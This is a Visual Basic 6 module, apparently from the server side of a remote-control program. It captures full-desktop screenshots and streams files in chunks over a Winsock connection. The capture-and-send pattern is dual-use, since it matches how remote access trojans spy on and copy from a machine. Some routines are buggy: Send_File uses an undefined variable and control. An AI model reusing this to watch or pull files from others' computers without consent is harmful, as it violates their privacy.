Attribute VB_Name = "modScreenshot"
Public Declare Function getDesktop Lib "JPGUtils.dll" (ByVal nWidth As Integer, ByVal nHeight As Integer, ByVal blnJpeg As Boolean, ByVal JPGCompressQuality As Integer, ByVal strFileName As String) As Integer
Public Declare Function ConvertBMPtoJPG Lib "JPGUtils.dll" (ByVal strFileName As String, ByVal JPGCompressQuality As Integer, ByVal blnKeepBMP As Boolean) As Integer
Public Declare Function OleCreatePictureIndirect Lib "olepro32.dll" (lpPictDesc As PICTDESC, riid As Any, ByVal fOwn As Long, ipic As IPicture) As Long
Public Declare Function GetDesktopWindow Lib "user32" () As Long
Public Declare Function CreateCompatibleDC Lib "gdi32" (ByVal hdc As Long) As Long
Public Declare Function CreateCompatibleBitmap Lib "gdi32" (ByVal hdc As Long, ByVal nWidth As Long, ByVal nHeight As Long) As Long
Public Declare Function SelectObject Lib "gdi32" (ByVal hdc As Long, ByVal hObject As Long) As Long
Public Declare Function BitBlt Lib "gdi32" (ByVal hDCDest As Long, ByVal XDest As Long, ByVal YDest As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal lScreenDC As Long, ByVal XSrc As Long, ByVal YSrc As Long, ByVal dwRop As Long) As Long
Public Declare Function DeleteDC Lib "gdi32" (ByVal hdc As Long) As Long
Public Declare Function GetWindowDC Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function ReleaseDC Lib "user32" (ByVal hwnd As Long, ByVal hdc As Long) As Long
Public Declare Function GetWindowRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long
Public Declare Function MoveToEx& Lib "gdi32" (ByVal hdc As Long, ByVal x As Long, ByVal y As Long, ByVal lp As Long)
Public Declare Function LineTo& Lib "gdi32" (ByVal hdc As Long, ByVal x As Long, ByVal y As Long)
Public Declare Function GetTickCount& Lib "kernel32" ()

Global sWait As Boolean

Public Type RECT
    Left As Long
    Top As Long
    Right As Long
    Bottom As Long
End Type

Public Type PICTDESC
    cbSize As Long
    pictType As Long
    hIcon As Long
    hPal As Long
End Type

Public Function TakeSS(Path As String, Quality As Integer)
SavePicture GetScreenSnapshot, Path
ConvertBMPtoJPG Path, Quality, True
End Function

Function GetScreenSnapshot(Optional ByVal hwnd As Long) As IPictureDisp

    Dim targetDC As Long
    Dim hdc As Long
    Dim tempPict As Long
    Dim oldPict As Long
    Dim wndWidth As Long
    Dim wndHeight As Long
    Dim Pic As PICTDESC
    Dim rcWindow As RECT
    Dim guid(3) As Long

    ' provide the right handle for the desktop window

    If hwnd = 0 Then hwnd = GetDesktopWindow
    
    ' get window's size
    GetWindowRect hwnd, rcWindow
    wndWidth = rcWindow.Right - rcWindow.Left
    wndHeight = rcWindow.Bottom - rcWindow.Top
    ' get window's device context
    targetDC = GetWindowDC(hwnd)

    ' create a compatible DC
    hdc = CreateCompatibleDC(targetDC)

    ' create a memory bitmap in the DC just created
    ' the has the size of the window we're capturing
    tempPict = CreateCompatibleBitmap(targetDC, wndWidth, wndHeight)
    oldPict = SelectObject(hdc, tempPict)

    ' copy the screen image into the DC
    BitBlt hdc, 0, 0, wndWidth, wndHeight, targetDC, 0, 0, vbSrcCopy

    ' set the old DC image and release the DC
    tempPict = SelectObject(hdc, oldPict)
    DeleteDC hdc
    ReleaseDC GetDesktopWindow, targetDC

    ' fill the ScreenPic structure

    With Pic

        .cbSize = Len(Pic)
        .pictType = 1           ' means picture
        .hIcon = tempPict
        .hPal = 0           ' (you can omit this of course)

    End With

    ' convert the image to a IpictureDisp object
    ' this is the IPicture GUID {7BF80980-BF32-101A-8BBB-00AA00300CAB}
    ' we use an array of Long to initialize it faster
    guid(0) = &H7BF80980
    guid(1) = &H101ABF32
    guid(2) = &HAA00BB8B
    guid(3) = &HAB0C3000
    ' create the picture,
    ' return an object reference right into the function result
    OleCreatePictureIndirect Pic, guid(0), True, GetScreenSnapshot

End Function

Public Sub TakeScreenshot(Path As String, Quality As Integer)
On Error Resume Next
If Quality < 1 Or Quality > 100 Then
    frmServer.Server.SendData "Error:  Quality must be between 1 and 100."
Else
    getDesktop 0, 0, True, Quality, Path
End If
End Sub

Public Sub SendFile(FileName As String, RemoteFileName As String)
'On Error Resume Next
Dim DataChunk As String
Dim CancelTransfer As Boolean
Dim ChunkSize As Long

Dim FileSize As Long
Dim TotalSize As Long

Open FileName For Binary Access Read As #1
    
    TotalSize = LOF(1)
    frmServer.Server.SendData "OpenFile|" & RemoteFileName & "|" & TotalSize
    Wait
    Pause 1
    
    ChunkSize = 2048
    
    Do Until FileSize = TotalSize
        If sConnected = False Then Exit Sub
        
        If Loc(1) > ChunkSize Then ChunkSize = LOF(1) - Loc(1)
        FileSize = FileSize + ChunkSize
        
        DataChunk = Space$(ChunkSize)
        Get #1, , DataChunk
        
        frmServer.Server.SendData DataChunk
        Wait
        DoEvents
    Loop
    
    Pause 1
    frmServer.Server.SendData "ClosFile"
    Wait
    Pause 1
Close #1
Error:
End Sub

Public Function Send_File(FileName As String, RemoteFileName As String)
    'This is the function that sends a file
    Dim Temp As String
    Dim BlockSize As Long
    
    Open FileToSend For Binary Access Read As #1 'Open the file to send
    BlockSize = 2048 'Set the block size, if needed, set it higher

    Do While Not EOF(1)
        Temp = Space$(BlockSize) 'Give temp some space to store the data
        Get #1, , Temp 'Get first line from file
        frmServer.Server.SendData "PutFile," + Temp 'Send the data
        DoEvents
    Loop
        winsock1.SendData "CloseFile" 'This is a custom control that ends the transmition
       Close #1
End Function

Public Sub Wait()
On Error Resume Next

If sWait Then
    Do Until sWait = False
        DoEvents
    Loop
End If
End Sub

Public Sub Pause(HowLong As Long)
On Error Resume Next

Dim u%, Tick As Long
Tick = GetTickCount()
    
Do
    u% = DoEvents
Loop Until Tick + HowLong < GetTickCount
End Sub
